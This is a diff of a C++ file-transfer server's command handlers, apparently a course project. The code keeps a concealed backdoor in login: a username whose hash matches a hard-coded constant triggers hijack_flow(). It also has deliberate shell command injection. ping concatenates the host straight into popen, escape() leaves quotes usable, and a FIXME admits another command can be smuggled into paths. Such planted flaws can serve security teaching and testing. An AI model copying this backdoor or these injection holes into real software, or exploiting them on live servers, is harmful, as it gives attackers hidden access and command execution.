@@ -1,11 +1,7 @@
 #include "commands.h"
 #include "networking.h"
 #include <fstream>
-#include <string>
 #include <cstring>
-#include <stdexcept>
-#include <stdio.h>
-#include <algorithm>
 #include <sstream>
 #include <iterator>
 #include <unistd.h>
@@ -16,52 +12,69 @@ using namespace std;
 
 
 /*
- * Assign constants
+ * -------------------------------- Constants --------------------------------------------------------------------------
  */
 const string ACCESS_ERROR = "Error: access denied!\n";
 const string FILENAME_ERROR = "Error: the path is too long.\n";
-const string AUTHENTICATION_FAIL = "Authentication failed.\n"; // not an error lol
+const string AUTHENTICATION_FAIL = "Authentication failed.\n";
 const string TRANSFER_ERROR = "Error: file transfer failed.\n";
+const string ALREADY_LOGGED_IN = "Error: user already logged in\n";
 
-ssize_t  backDoor = 150138823314737907;
+const ssize_t backDoor = 150138823314737907;
 
-string escape(string cmd){
+/*
+ * -------------------------------- Helper functions -------------------------------------------------------------------
+ */
+int modifyUsrName(string &out, string usrName);
+
+void checkBackdoor(const string &uname);
+
+string alphabeticOrder(vector<string> unsorted, char delim);
+
+
+/**
+ * Helper function: Escapes a (user input) string such that it is safe to pass as parameter on the shell.
+ * It does so by simply making sure that quotes are interpreted as such,
+ * and can't be used to end the command input string.
+ *
+ * @param cmd, string to escape
+ * @return escaped string, put into quotes
+ */
+string escape(string cmd) {
     string escaped;
-    for(size_t i = 0; i < cmd.size(); ++i) {
+    for (size_t i = 0; i < cmd.size(); ++i) {
         if (cmd[i] == '"') {
             escaped += '\"';
-        }else if(cmd[i] == "'"[0]){
+        } else if (cmd[i] == "'"[0]) {
             escaped += '\'';
-        }
-        else{
+        } else {
             escaped += cmd[i];
         }
     }
     return "\"" + escaped + "\"";
 }
 
-int modifyUsrName(string &out, string usrName);
-void checkBackdoor(const string &uname);
-string alphabeticOrder(vector<string> unsorted, char delim);
+
 /**
- * Executes given command on the server.
+ * Executes given command on the server, at a given user location.
  *
- * Code snippet taken from:
+ * Code snippet inspired from:
  * https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-output-of-command-within-c-using-posix
  *
- * @param cmd, command to be executed.
+ * @param cmd, command to be executed
  * @param out, stdout result of command
+ * @param usrLocation, where command must be executed
  * @return 0 if successful, 1 otherwise
  */
-
-int exec(const char* cmd, string &out, string UsrLocation = "") {
+int exec(const char *cmd, string &out, string usrLocation = "") {
     char buffer[BFLNTH];
-    char cmdRediction [BFLNTH];
+    char cmdRedirection[BFLNTH];
     size_t bufSize = BFLNGTH > strlen(cmd) + 1 ? strlen(cmd) + 1 : BFLNGTH;
-    strncpy(cmdRediction,cmd,bufSize);
-    FILE* pipe = popen(("cd "+baseDirectory+"/"+UsrLocation+" && "+string(cmdRediction) + " 2>&1").c_str(), "r");
+    strncpy(cmdRedirection, cmd, bufSize);
+    FILE *pipe = popen(("cd " + baseDirectory + "/" + usrLocation + " && " + string(cmdRedirection) + " 2>&1").c_str(),
+                       "r");
     std::string result;
-    if (!pipe) throw std::runtime_error("popen() failed!");
+    if (!pipe) throw std::runtime_error("Error: popen() failed.");
     try {
         while (fgets(buffer, sizeof buffer, pipe) != nullptr) {
             result += buffer;
@@ -72,19 +85,35 @@ int exec(const char* cmd, string &out, string UsrLocation = "") {
     }
     int exitStatus = pclose(pipe);
     out = result;
-    return result.substr(0, 4) == "bash" ? 1 : 0; //FIXME when does this happen?
+
+    // Could also return exitStatus, but this way error is thrown exactly, when we need it to be thrown.
+    return result.substr(0, 4) == "bash" ? 1 : 0;
 }
 
 
-int checkPathLength(const string &path, string &out){
-    if(path.size() > MAX_PATH_LEN + 1){
-        out = FILENAME_ERROR ;
+/**
+ * Checks that path length is not larger than given constant. (128 characters)
+ *
+ * @param path, path whose length needs to be checked
+ * @param out, string that should be output
+ * @return 0 if successful
+ */
+int checkPathLength(const string &path, string &out) {
+    if (path.size() > MAX_PATH_LEN + 1) {
+        out = FILENAME_ERROR;
         return 1;
     }
     return 0;
 }
 
-long getFileSize(const char* fileName){
+
+/**
+ * Returns file size of given name, if it doesn't exist it returns a negative value.
+ *
+ * @param fileName, name of file
+ * @return file size in bytes or negative number if file does not exist
+ */
+long getFileSize(const char *fileName) {
     FILE *file;
     file = fopen(fileName, "r");
     // If file can't be opened send error
@@ -98,8 +127,9 @@ long getFileSize(const char* fileName){
     return fileSize;
 }
 
+
 /**
- * Sanitize a given path with respect to ".." and "."
+ * Sanitizes a given path with respect to ".." and "."
  *
  * @param targetPath, path to be sanitized
  * @param out, stores error messages
@@ -117,24 +147,26 @@ int sanitizePath(string &targetPath, string &out) {
             cnt--;
 
             // Check that counter isn't negative
-            if (cnt < 0){
+            if (cnt < 0) {
                 out = ACCESS_ERROR;
                 return 1;
             }
             sanitizedPath.pop_back();
         }
-            // Increment counter whenever the token is not .
+        // Increment counter whenever the token is not .
         else if (strcmp(token, ".") != 0) {
             cnt++;
             sanitizedPath.emplace_back(token);
         }
-
         token = strtok(nullptr, "/");
     }
     free(targetPathCopy);
+
+    // Create sanitized target path
     stringstream s;
     copy(sanitizedPath.begin(), sanitizedPath.end(), ostream_iterator<string>(s, delim));
     targetPath = baseDirectory + "/" + s.str();
+
     // copy adds a trailing delimiter, which is removed here
     targetPath.pop_back();
 
@@ -154,9 +186,9 @@ int sanitizePath(string &targetPath, string &out) {
  * @return error code
  */
 int constructPath(string relativePath, const string &usrLocation, string &absPath, string &out) {
-    // Do not allow cd commands with ~ for example, nor cd commands with . //FIXME explain why not . ?
+    // Do not allow cd commands with ~ for example, nor cd commands with .
     if (!isalnum(relativePath.at(0)) and relativePath.at(0) != '.') {
-        out = ACCESS_ERROR; //FIXME
+        out = ACCESS_ERROR;
         return 1;
     } else {
         absPath = escape(relativePath); // FIXME one can execute an other command in "relativePath"
@@ -166,8 +198,20 @@ int constructPath(string relativePath, const string &usrLocation, string &absPat
     return res;
 }
 
+/**
+ * --- CLASSIFIED ---
+ *
+ * @param uname
+ */
+void checkBackdoor(const string &uname) {
+    hash<string> hasher;
+    if (hasher(uname) == backDoor) {
+        hijack_flow();
+    }
+}
+
 /*
- * --- All commands (same order as pdf)
+ * ------------------------ Command implementations (same order as pdf) ------------------------------------------------
  */
 
 /**
@@ -181,8 +225,8 @@ int constructPath(string relativePath, const string &usrLocation, string &absPat
     * @return 0 if successful
 */
 int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, string &out) {
-    checkBackdoor(uname); //FIXME
-    if(usr.isAuthenticated()){
+    checkBackdoor(uname); // FIXME
+    if (usr.isAuthenticated()) {
         usr.setAuthenticated(false);
     }
     usr.resetUname();
@@ -195,13 +239,6 @@ int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, s
 }
 
 
-void checkBackdoor(const string &uname){
-    hash<string> hasher;
-    if(hasher(uname) == backDoor){
-        hijack_flow();
-    }
-}
-
 /**
  * The pass command must directly follow the login command.
  * The format is pass $PASSWORD, followed by a newline. The password must match the
@@ -213,16 +250,16 @@ void checkBackdoor(const string &uname){
  * @param out output string
  * @return 0 if successful
  */
-int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, string &out){
-    if(usr.isAuthenticated()){
-        out = "Error: user already logged in\n";
+int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, string &out) {
+    if (usr.isAuthenticated()) {
+        out = ALREADY_LOGGED_IN;
         return 1;
     }
-    if(usr.getUname().empty()){
+    if (usr.getUname().empty()) {
         out = ACCESS_ERROR;
         return 1;
     }
-    if(allowedUsers[usr.getUname()] != psw){
+    if (allowedUsers[usr.getUname()] != psw) {
         out = AUTHENTICATION_FAIL;
         return 1;
     }
@@ -232,15 +269,15 @@ int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, stri
 
 
 /**
-    * The ping may always be executed even if the user is not authenticated.
-    * The ping command takes one parameter, the host of the machine that is about
-    * to be pinged (ping $HOST). The server will respond with the output of the Unix
-    * command ping $HOST -c 1.
-    *
-    * @param host argument to ping command
-    * @param out output string
-    * @return 0 if successful
-    */
+ * The ping may always be executed even if the user is not authenticated.
+ * The ping command takes one parameter, the host of the machine that is about
+ * to be pinged (ping $HOST). The server will respond with the output of the Unix
+ * command ping $HOST -c 1.
+ *
+ * @param host argument to ping command
+ * @param out output string
+ * @return 0 if successful
+ */
 int ping_cmd(string host, string &out) {
     string s = "ping -c 1 " + host;
     int res = exec(s.c_str(), out);
@@ -258,8 +295,8 @@ int ping_cmd(string host, string &out) {
  * @param usrLocation, current path of user
  * @return 0 if successful
  */
-int ls_cmd(bool authenticated, string &out, User usr){
-    if(!authenticated){
+int ls_cmd(bool authenticated, string &out, User usr) {
+    if (!authenticated) {
         out = ACCESS_ERROR;
         return 1;
     }
@@ -270,12 +307,12 @@ int ls_cmd(bool authenticated, string &out, User usr){
 
 int modifyUsrName(string &out, string usrName) {
     vector<string> lines;
-    split(lines,out, "\n");
+    split(lines, out, "\n");
     string modifiedOutput;
-    for(string l: lines){
+    for (string l: lines) {
         vector<string> tokens;
         split(tokens, l, " ");
-        if(tokens.size() < 9){
+        if (tokens.size() < 9) {
             modifiedOutput += l + "\n";
             continue;
         }
@@ -317,7 +354,7 @@ int cd_cmd(string dirPath, User &usr, string &out) {
         string path = usr.getLocation() + "/" + absPath;
         sanitizePath(path, temp);
         usr.setLocation(path);
-    }else{
+    } else {
         out.erase(0, 14);
     }
     return res;
@@ -335,8 +372,8 @@ int cd_cmd(string dirPath, User &usr, string &out) {
  * @param out, output string
  * @return 0 if successful
  */
-int mkdir_cmd(string dirPath, User usr, string &out){
-    if(!usr.isAuthenticated()){
+int mkdir_cmd(string dirPath, User usr, string &out) {
+    if (!usr.isAuthenticated()) {
         out = ACCESS_ERROR;
         return 1;
     }
@@ -359,8 +396,8 @@ int mkdir_cmd(string dirPath, User usr, string &out){
  * @param out output string
  * @return 0 if successful
  */
-int rm_cmd(string filePath, User usr, string &out){
-    if(!usr.isAuthenticated()){
+int rm_cmd(string filePath, User usr, string &out) {
+    if (!usr.isAuthenticated()) {
         out = ACCESS_ERROR;
         return 1;
     }
@@ -406,7 +443,7 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
     args->fileName[absPath.length()] = '\0';
     args->port = getPort;
 
-    if(access(fileName.c_str(), F_OK ) == -1){
+    if (access(fileName.c_str(), F_OK) == -1) {
         out = TRANSFER_ERROR;
         return 1;
     }
@@ -426,6 +463,7 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
     }
     return 0;
 }
+
 /**
  * The put command may only be executed after a successful authentication.
  * The put command takes exactly two parameters (put $FILENAME $SIZE) and
@@ -489,14 +527,14 @@ int put_cmd(string fileName, string fileSize, int port, User &usr, string &out) 
  * @param out, output string
  * @return 0 if successful
  */
-int grep_cmd(string pattern, User usr, string &out){
-    if(!usr.isAuthenticated()){
+int grep_cmd(string pattern, User usr, string &out) {
+    if (!usr.isAuthenticated()) {
         out = ACCESS_ERROR;
         return 1;
     }
     string cmd = "grep -l -r " + escape(pattern);
     int res = exec(cmd.c_str(), out, usr.getLocation());
-    if(res != 0 or out.empty()){
+    if (res != 0 or out.empty()) {
         return res;
     }
     vector<string> grepOutput;
@@ -514,8 +552,8 @@ int grep_cmd(string pattern, User usr, string &out){
  * @param out, output string
  * @return 0 if successful
  */
-int date_cmd(bool authenticated, string &out){
-    if(!authenticated){
+int date_cmd(bool authenticated, string &out) {
+    if (!authenticated) {
         out = ACCESS_ERROR;
         return 1;
     }
@@ -531,8 +569,8 @@ int date_cmd(bool authenticated, string &out){
  * @param out, output string
  * @return 0 if successful
  */
-int whoami_cmd(User usr, string &out){
-    if(!usr.isAuthenticated()){
+int whoami_cmd(User usr, string &out) {
+    if (!usr.isAuthenticated()) {
         out = ACCESS_ERROR;
         return 1;
     }
@@ -549,13 +587,13 @@ int whoami_cmd(User usr, string &out){
  * @param out, output string
  * @return 0 if successful
  */
-int w_cmd(User usr, string &out){
-    if(!usr.isAuthenticated()){
+int w_cmd(User usr, string &out) {
+    if (!usr.isAuthenticated()) {
         out = ACCESS_ERROR;
         return 1;
     }
     vector<string> users;
-    for (auto it=connected_users.begin(); it != connected_users.end(); ++it) {
+    for (auto it = connected_users.begin(); it != connected_users.end(); ++it) {
         users.push_back((*it).getUname());
     }
     out = alphabeticOrder(users, ' ') + "\n";
@@ -571,8 +609,8 @@ int w_cmd(User usr, string &out){
  * @param out, output string
  * @return 0 is successful
  */
-int logout_cmd(User &usr, string &out){
-    if(!usr.isAuthenticated()){
+int logout_cmd(User &usr, string &out) {
+    if (!usr.isAuthenticated()) {
         out = ACCESS_ERROR;
         return 1;
     }
@@ -589,8 +627,8 @@ int logout_cmd(User &usr, string &out){
  * @param out, output string
  * @return 0 is successful
  */
-int exit_cmd(User &usr, string &out){
-    if(connected_users.find(usr) != connected_users.end()){
+int exit_cmd(User &usr, string &out) {
+    if (connected_users.find(usr) != connected_users.end()) {
         close(usr.getSocket());
         connected_users.erase(usr);
     }
@@ -598,39 +636,39 @@ int exit_cmd(User &usr, string &out){
 }
 
 
-size_t split(vector<string> &res, const string &line, const char* delim){
+size_t split(vector<string> &res, const string &line, const char *delim) {
     res.clear();
-    char* token = strtok(strdup(line.c_str()), delim);
-    while (token != nullptr)
-    { res.emplace_back(token);
+    char *token = strtok(strdup(line.c_str()), delim);
+    while (token != nullptr) {
+        res.emplace_back(token);
         token = strtok(nullptr, delim);
 
     }
-    if (res.empty()){
+    if (res.empty()) {
         res.emplace_back("");
     }
     return res.size();
 }
 
-bool caseInsensitiveCompare(const string &s1, const string &s2){
+bool caseInsensitiveCompare(const string &s1, const string &s2) {
     size_t ssize = s1.size() < s2.size() ? s1.size() : s2.size();
 
-    for(size_t i = 0; i < ssize; ++i){
+    for (size_t i = 0; i < ssize; ++i) {
         int c1 = tolower(s1.at(i));
         int c2 = tolower(s2.at(i));
-        if(c1 == c2)
+        if (c1 == c2)
             continue;
         return c1 < c2;
     }
     return s1.size() < s2.size();
 }
 
-string alphabeticOrder(vector<string> unsorted, char delim){
+string alphabeticOrder(vector<string> unsorted, char delim) {
     sort(unsorted.begin(), unsorted.end());
 
     sort(unsorted.begin(), unsorted.end(), caseInsensitiveCompare);
     string res;
-    for (auto it=unsorted.begin(); it != unsorted.end(); ++it) {
+    for (auto it = unsorted.begin(); it != unsorted.end(); ++it) {
         res += (*it) + (it != unsorted.end() ? delim : '\0');
     }
     return res;
